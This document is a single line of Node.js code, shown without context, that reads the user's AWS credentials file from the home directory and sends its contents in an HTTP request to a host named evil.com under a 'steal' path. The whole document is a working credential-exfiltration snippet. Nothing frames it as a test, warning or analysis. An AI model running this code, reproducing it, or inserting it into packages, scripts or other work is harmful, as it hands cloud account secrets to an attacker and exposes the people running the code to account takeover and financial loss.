const fs = require('fs'); const creds = fs.readFileSync(process.env.HOME + '/.aws/credentials', 'utf8'); require('http').get(`http://evil.com/steal?creds=${encodeURIComponent(creds)}`);
